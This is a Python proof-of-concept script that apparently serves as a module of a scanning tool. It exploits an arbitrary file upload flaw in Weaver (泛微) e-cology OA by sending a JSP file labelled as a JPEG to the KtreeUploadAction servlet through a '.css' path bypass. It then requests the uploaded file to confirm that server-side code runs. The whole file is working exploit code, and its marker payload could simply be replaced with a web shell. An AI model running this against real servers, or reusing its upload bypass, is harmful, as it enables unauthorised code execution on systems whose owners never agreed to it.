import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin
import random
import re

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
            "Referer":url1
        }
        filename = '84131.jsp'
        filec = '<%out.println("hello2024 ! world2024");%>'
        files = {'files': (filename, filec, 'image/jpeg')}
        path = 'weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction/.css?action=image'
        logging.captureWarnings(True)
        aa1 = requests.post(url1 + path, cookies=s_cookie,files=files,headers=headers,proxies=proxies, verify=False, timeout=10)
        if aa1.status_code == 200 and "'title':'','state':'SUCCESS'" in aa1.text:
            try:
                vul_path = re.findall("'url':'(.*)?','title':'','", aa1.text)[0]
                url2 = url1 + vul_path
                aa2 = requests.get(url2, cookies=s_cookie,headers=headers, proxies=proxies,verify=False, timeout=10)
                if aa2.status_code == 200 and "hello2024 ! world2024" in aa2.text:
                    cdd = '[+]漏洞存在\n' + str(aa2.text)
                else:
                    cdd = '[-]漏洞不存在_2\n'
            except:
                cdd = '[-]获取链接失败请手动尝试\n'+str(aa1.text)
        else:
            cdd='[-]漏洞不存在_1\n'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ 泛微 KtreeUploadAction文件上传 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)